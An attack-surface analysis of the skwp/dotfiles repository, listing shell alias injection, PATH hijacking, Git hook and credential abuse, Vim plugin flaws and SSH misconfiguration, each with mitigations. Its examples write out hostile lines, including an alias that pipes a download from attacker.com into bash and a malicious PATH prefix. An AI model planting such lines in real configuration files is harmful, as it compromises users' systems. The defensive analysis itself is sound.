# Attack Surface Analysis for skwp/dotfiles

## Attack Surface: [Shell Alias and Function Injection](./attack_surfaces/shell_alias_and_function_injection.md)

*   **Description:**  Attackers can modify custom aliases and functions within shell configuration files (e.g., `.bashrc`, `.zshrc`, `functions/*`) to inject malicious code.
    *   **Dotfiles Contribution:**  The `skwp/dotfiles` heavily rely on custom aliases and functions for workflow optimization, creating numerous potential injection points.
    *   **Example:**  An attacker modifies the alias `alias ga='git add'` to `alias ga='git add && curl http://attacker.com/malware | bash'`.  When the user runs `ga`, the malware is downloaded and executed.
    *   **Impact:**  Complete system compromise, arbitrary code execution, data exfiltration, persistence.
    *   **Risk Severity:** **Critical**
    *   **Mitigation Strategies:**
        *   **Code Review:**  Thoroughly review all aliases and functions for suspicious code or unintended behavior.  Understand what each command does *before* adding it to your dotfiles.
        *   **Regular Audits:**  Periodically inspect your shell configuration files for unauthorized modifications.  Use file integrity monitoring tools.
        *   **Least Privilege:**  Avoid running shell sessions as root.  Use `sudo` only when absolutely necessary.
        *   **Version Control:**  Track changes to your dotfiles using Git.  This allows you to revert to previous versions if necessary and provides an audit trail.
        *   **Sandboxing (Advanced):**  Consider running untrusted commands or scripts in a sandboxed environment (e.g., a container).

## Attack Surface: [Environment Variable Manipulation (PATH)](./attack_surfaces/environment_variable_manipulation__path_.md)

*   **Description:**  Attackers can modify the `PATH` environment variable to prioritize malicious executables over legitimate system binaries.
    *   **Dotfiles Contribution:**  The `skwp/dotfiles` likely modifies the `PATH` to include custom bin directories, creating an opportunity for attackers to insert their own paths.
    *   **Example:**  An attacker adds `export PATH=/tmp/malicious:$PATH` to `.bashrc`.  They then place a malicious executable named `ls` in `/tmp/malicious`.  When the user runs `ls`, the malicious version is executed instead of the system's `ls`.
    *   **Impact:**  Arbitrary code execution, privilege escalation, system compromise.
    *   **Risk Severity:** **Critical**
    *   **Mitigation Strategies:**
        *   **Careful PATH Ordering:**  Ensure that system directories (e.g., `/bin`, `/usr/bin`) appear *before* any custom directories in the `PATH`.
        *   **Regular Review:**  Periodically check the `PATH` variable for unexpected entries.
        *   **Avoid Relative Paths:**  Use absolute paths whenever possible in the `PATH` to avoid ambiguity.
        *   **Least Privilege:**  Avoid running shell sessions as root.

## Attack Surface: [Git Configuration Exploitation (Hooks & Credentials)](./attack_surfaces/git_configuration_exploitation__hooks_&_credentials_.md)

*   **Description:**  Attackers can modify the `.gitconfig` file or Git hooks to execute malicious code or steal credentials.
    *   **Dotfiles Contribution:**  The `skwp/dotfiles` likely includes a `.gitconfig` file with custom settings and potentially global Git hooks.
    *   **Example:**
        *   **Credential Theft:**  An attacker finds plain-text Git credentials (username/password) stored in `.gitconfig`.
        *   **Hook Injection:**  An attacker modifies a global Git hook (e.g., `pre-commit`) to execute a malicious script whenever a commit is made.
    *   **Impact:**  Credential theft, code execution, repository compromise, data exfiltration.
    *   **Risk Severity:** **High**
    *   **Mitigation Strategies:**
        *   **Credential Helper:**  Use a Git credential helper (e.g., `git-credential-store`, `git-credential-cache`, or OS-specific keychains) to securely store Git credentials.  *Never* store credentials directly in `.gitconfig`.
        *   **Hook Review:**  Carefully review all Git hooks (both global and repository-specific) for malicious code.
        *   **Two-Factor Authentication:**  Enable two-factor authentication for your Git hosting provider (e.g., GitHub, GitLab, Bitbucket).
        *   **SSH Keys:**  Use SSH keys for authentication instead of passwords.

## Attack Surface: [Vim/Neovim Plugin Vulnerabilities](./attack_surfaces/vimneovim_plugin_vulnerabilities.md)

*   **Description:**  Vim/Neovim plugins, often written in Vimscript or Lua, can contain vulnerabilities that attackers can exploit.
    *   **Dotfiles Contribution:**  The `skwp/dotfiles` likely uses a plugin manager (e.g., `vim-plug`) and includes numerous plugins, increasing the attack surface.
    *   **Example:**  An attacker exploits a known vulnerability in a specific Vim/Neovim plugin to gain code execution when the user opens a specially crafted file.
    *   **Impact:**  Arbitrary code execution, system compromise, data exfiltration.
    *   **Risk Severity:** **High**
    *   **Mitigation Strategies:**
        *   **Plugin Updates:**  Regularly update all Vim/Neovim plugins to the latest versions.
        *   **Plugin Selection:**  Choose plugins from reputable sources and with a good security track record.  Avoid installing plugins from unknown or untrusted sources.
        *   **Plugin Auditing:**  Periodically review the code of installed plugins for potential vulnerabilities.
        *   **Plugin Sandboxing (Advanced):**  Consider using a plugin manager that supports sandboxing or isolation features.
        *   **Disable Unnecessary Plugins:** Remove any plugins that you don't actively use.

## Attack Surface: [SSH Configuration Misuse](./attack_surfaces/ssh_configuration_misuse.md)

*   **Description:**  Incorrect or insecure SSH configuration in `~/.ssh/config` can lead to compromised connections or unauthorized access.
    *   **Dotfiles Contribution:** The `skwp/dotfiles` likely includes an `~/.ssh/config` file with custom settings for SSH connections.
    *   **Example:** An attacker modifies `~/.ssh/config` to disable host key verification (`StrictHostKeyChecking no`), allowing them to perform a man-in-the-middle attack.
    *   **Impact:**  Man-in-the-middle attacks, credential theft, unauthorized access to remote systems.
    *   **Risk Severity:** **High**
    *   **Mitigation Strategies:**
        *   **Enable StrictHostKeyChecking:**  Ensure `StrictHostKeyChecking` is set to `yes` or `ask` in `~/.ssh/config` to prevent connecting to untrusted hosts.
        *   **Use Strong Ciphers and MACs:**  Configure SSH to use strong cryptographic algorithms.
        *   **Limit Key Forwarding:**  Avoid using `ForwardAgent` unless absolutely necessary, and be aware of the security implications.
        *   **Regularly Review Configuration:**  Periodically review your `~/.ssh/config` file for any unexpected or insecure settings.
        *   **Use a Dedicated SSH Key per Host (Best Practice):** Avoid reusing the same SSH key for multiple hosts.

